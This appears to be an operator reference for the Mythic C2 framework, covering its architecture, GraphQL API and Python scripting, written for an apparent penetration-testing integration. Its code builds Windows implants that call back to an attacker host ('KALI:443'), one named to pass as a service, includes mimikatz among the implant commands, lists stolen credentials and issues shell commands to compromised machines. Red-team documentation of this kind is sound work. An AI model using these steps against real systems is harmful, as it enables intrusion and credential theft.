# Mythic C2 Architecture Reference

## System Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        mythic_nginx                             │
│                    (Reverse Proxy :7443)                         │
│  Routes to: React UI, GraphQL, Docs, Jupyter, Server            │
└─────────┬───────────────────────────────────────────────────────┘
          │
┌─────────┴───────────────────────────────────────────────────────┐
│                       mythic_server                              │
│              (GoLang — Core Logic & GraphQL API)                 │
│  - Agent message routing                                         │
│  - Task creation / tracking                                      │
│  - MITRE ATT&CK mapping                                         │
│  - Artifact tracking (OpSec)                                     │
│  - Credential management                                         │
│  - File management                                               │
│  - Webhook / eventing                                            │
└─────────┬───────────────┬───────────────────────────────────────┘
          │               │
┌─────────┴─────┐  ┌─────┴────────────────────────────────────────┐
│ mythic_postgres│  │            mythic_rabbitmq                    │
│ (PostgreSQL)   │  │  (Message Broker — connects server to agents) │
│ - Operations   │  │  - Payload Type containers                    │
│ - Callbacks    │  │  - C2 Profile containers                      │
│ - Tasks/Output │  │  - Translation containers                     │
│ - Credentials  │  │                                               │
│ - Payloads     │  │                                               │
│ - Files        │  │                                               │
└────────────────┘  └──────┬──────────────────────────────────────┘
                           │
       ┌───────────────────┼───────────────────┐
       │                   │                   │
┌──────┴────────┐  ┌───────┴───────┐  ┌───────┴───────┐
│ Apollo        │  │ Poseidon      │  │ Medusa        │
│ (Payload Type)│  │ (Payload Type)│  │ (Payload Type)│
│ .NET/Windows  │  │ Go/Linux/macOS│  │ Python/Any    │
└───────────────┘  └───────────────┘  └───────────────┘
       │                   │                   │
┌──────┴────────┐  ┌───────┴───────┐  ┌───────┴───────┐
│ HTTP C2       │  │ SMB C2        │  │ TCP C2        │
│ (C2 Profile)  │  │ (C2 Profile)  │  │ (C2 Profile)  │
└───────────────┘  └───────────────┘  └───────────────┘
```

## API Access

### GraphQL Endpoint
- **URL**: `https://<mythic_host>:7443/graphql/`
- **Auth**: `apitoken: <MYTHIC_API_KEY>` header
- **Console**: Hasura console at `https://<mythic_host>:7443/console/`
- **WebSocket**: `wss://<mythic_host>:7443/graphql/` for subscriptions

### Key GraphQL Queries

```graphql
# List active callbacks
query {
  callback(where: {active: {_eq: true}}) {
    id
    display_id
    host
    user
    ip
    os
    architecture
    pid
    integrity_level
    domain
    payload { payload_type { name } }
    last_checkin
  }
}

# List payloads
query {
  payload {
    id
    uuid
    os
    payload_type { name }
    build_phase
    creation_time
    c2profileparametersinstances {
      c2profile { name }
    }
  }
}

# Get task output
query {
  task(where: {id: {_eq: $task_id}}) {
    id
    command_name
    status
    completed
    responses {
      response
    }
  }
}

# List credentials
query {
  credential {
    id
    type
    realm
    account
    credential
    comment
    task { callback { host } }
  }
}
```

### Key GraphQL Mutations

```graphql
# Create a task (issue command to callback)
mutation {
  createTask(
    callback_id: $callback_id,
    command: "shell",
    params: "whoami /all"
  ) {
    id
    status
  }
}

# Create a payload
mutation {
  createPayload(payloadDefinition: {
    payload_type: "apollo",
    selected_os: "Windows",
    c2_profiles: [{
      c2_profile: "http",
      c2_profile_parameters: {
        "callback_host": "https://KALI:443",
        "callback_port": "443",
        "callback_interval": "10"
      }
    }],
    commands: ["shell", "upload", "download", "ps", "screenshot", "mimikatz"],
    build_parameters: [{
      name: "output_type",
      value: "WinExe"
    }],
    filename: "payload.exe",
    description: "Apollo HTTP agent"
  }) {
    uuid
    status
  }
}
```

## Mythic Scripting (Python PyPi: `mythic`)

```python
import asyncio
from mythic import mythic

async def main():
    # Connect
    m = await mythic.login(
        server_ip="mythic_host",
        server_port=7443,
        username="mythic_admin",
        password="password",
        ssl=True
    )

    # Or use API key
    m = await mythic.login(
        server_ip="mythic_host",
        server_port=7443,
        apitoken="YOUR_API_KEY",
        ssl=True
    )

    # Create payload
    payload = await mythic.create_payload(
        m,
        payload_type_name="apollo",
        operating_system="Windows",
        c2_profiles=[{
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": "https://kali:443",
                "callback_port": "443"
            }
        }],
        commands=["shell", "upload", "download", "ps", "screenshot"],
        filename="svc.exe"
    )

    # Wait for build
    payload = await mythic.wait_for_payload_build(m, payload["uuid"])

    # Download built payload
    content = await mythic.download_payload(m, payload["uuid"])
    with open("/tmp/svc.exe", "wb") as f:
        f.write(content)

    # List callbacks
    callbacks = await mythic.get_all_active_callbacks(m)
    for cb in callbacks:
        print(f"Callback {cb['display_id']}: {cb['user']}@{cb['host']} ({cb['os']})")

    # Issue task
    task = await mythic.create_task(
        m,
        callback_display_id=1,
        command_name="shell",
        params="whoami /all"
    )

    # Wait for output
    output = await mythic.wait_for_task_output(m, task["id"])
    print(output)

asyncio.run(main())
```

## Container Communication Flow

1. **Operator** → Nginx → React UI (or direct GraphQL)
2. **GraphQL mutation** → mythic_server → PostgreSQL (store task)
3. **mythic_server** → RabbitMQ → Payload Type container (process task)
4. **C2 Profile** receives agent checkin → RabbitMQ → mythic_server
5. **mythic_server** decodes message → stores response → notifies UI via WebSocket

## Environment Variables (TazoSploit Integration)

| Variable | Default | Description |
|----------|---------|-------------|
| `MYTHIC_URL` | `https://mythic:7443` | Mythic server URL |
| `MYTHIC_API_KEY` | (required) | API key for authentication |
| `MYTHIC_ADMIN_USER` | `mythic_admin` | Admin username (login fallback) |
| `MYTHIC_ADMIN_PASSWORD` | (from .env) | Admin password (login fallback) |
| `MYTHIC_SSL_VERIFY` | `false` | Verify SSL certificate |
| `MYTHIC_C2_CALLBACK_HOST` | (auto-detect) | Host agents call back to |
| `MYTHIC_C2_CALLBACK_PORT` | `443` | Port agents call back to |
| `MYTHIC_DEFAULT_AGENT` | `apollo` | Default agent for Windows targets |
| `MYTHIC_SIDECAR` | `true` | Whether Mythic runs as sidecar |
